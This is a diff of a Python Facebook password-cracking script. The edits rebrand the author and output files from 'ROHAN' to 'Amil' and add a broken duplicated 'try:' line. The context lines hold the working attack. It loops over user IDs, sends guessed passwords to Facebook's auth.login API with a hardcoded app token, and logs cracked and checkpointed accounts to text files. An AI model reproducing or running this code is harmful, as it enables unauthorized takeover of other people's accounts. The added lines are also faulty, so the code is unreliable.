@@ -389,7 +389,7 @@ logo ="""
 \033[1;93m88 `88. `8b  d8' 88   88 88   88 88  V888 
 \033[1;93m88   YD  `Y88P'  YP   YP YP   YP VP   V8P                       
 \033[1;92m-----------------------------------------------
-\033[1;92m☆AUTHOR   : ROHAN ALI
+\033[1;92m☆AUTHOR   : Amil ALI
 \033[1;92m☆FACEBOOK : ROHAN ALI
 \033[1;92m☆WHATSAPP : 03114500464
 \033[1;92m-----------------------------------------------"""
@@ -650,15 +650,15 @@ def crack_select():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q:
-				print(" \033[1;32m [SARFRAZ-OK] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("SARFRAZok.txt", "a")
+				print(" \033[1;32m [Amil-OK] "+uid+" | "+pass1+"\033[0;97m")
+				ok = open("Amilok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [ROHAN_CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("ROHANcp.txt", "a")
+					print(" \033[1;33m [Amil_CP] "+uid+" | "+pass1+"\033[0;97m")
+					cp = open("Amilcp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
@@ -667,15 +667,15 @@ def crack_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m [ROHAN-OK] "+uid+" | "+pass2+"\033[0;97m")
-						ok = open("ROHANok.txt", "a")
+						print(" \033[1;32m [Amil-OK] "+uid+" | "+pass2+"\033[0;97m")
+						ok = open("Amilok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [ROHAN_CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("ROHANcp.txt", "a")
+							print(" \033[1;33m [Amil_CP] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("Amilcp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
@@ -781,6 +781,7 @@ def choice_select():
 		pass2 = raw_input(" Password: ")
 		pass3 = raw_input(" Password: ")
 		idt = raw_input(" Input id: ")
+		try:idt = raw_input(" Input id: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
@@ -812,6 +813,7 @@ def choice_select():
 		pass2 = raw_input(" Password: ")
 		pass3 = raw_input(" Password: ")
 		idt = raw_input(" Input id: ")
+		try:idt = raw_input(" Input id: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 			q = json.loads(r.text)
@@ -856,15 +858,15 @@ def choice_select():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q:
-				print(" \033[1;32m [ROHAN-OK] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("ROHANok.txt", "a")
+				print(" \033[1;32m [Amil-OK] "+uid+" | "+pass1+"\033[0;97m")
+				ok = open("Amilok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [ROHAN_CP] "+uid+" | "+pass1+"\033[0;97m")
-					cp = open("ROHANcp.txt", "a")
+					print(" \033[1;33m [RAmil_CP] "+uid+" | "+pass1+"\033[0;97m")
+					cp = open("Amilcp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
@@ -965,15 +967,15 @@ def ran():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m[ROHAN_OK] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
-						ok = open("ROHANok.txt", "a")
+						print(" \033[1;32m[Amil_OK] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
+						ok = open("Amilok.txt", "a")
 						ok.write(k+co+user+"|"+pass2+"\n")
 						ok.close()
 						oks.append(k+co+user+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [ROHAN_CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open("ROHANcp.txt", "a")
+							print(" \033[1;33m [Amil_CP] "+uid+" | "+pass2+"\033[0;97m")
+							cp = open("Amilcp.txt", "a")
 							cp.write(k+co+user+"|"+pass2+"\n")
 							cp.close()
 							cps.append(k+co+user+pass2)
@@ -982,15 +984,15 @@ def ran():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
 							q = json.loads(data)
 							if "access_token" in q:
-								print(" \033[1;32m[ROHAN_OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
-								ok = open("ROHANok.txt", "a")
+								print(" \033[1;32m[Amil_OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
+								ok = open("Amilok.txt", "a")
 								ok.write(k+co+user+"|"+pass3+"\n")
 								ok.close()
 								oks.append(k+co+user+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;33m [ROHAN_CP] "+k+co+user+" | "+pass3+"\033[0;97m")
-									cp = open("ROHANcp.txt", "a")
+									print(" \033[1;33m [Amil_CP] "+k+co+user+" | "+pass3+"\033[0;97m")
+									cp = open("AMilcp.txt", "a")
 									cp.write(k+co+user+"|"+pass3+"\n")
 									cp.close()
 									cps.append(k+co+user+pass3)
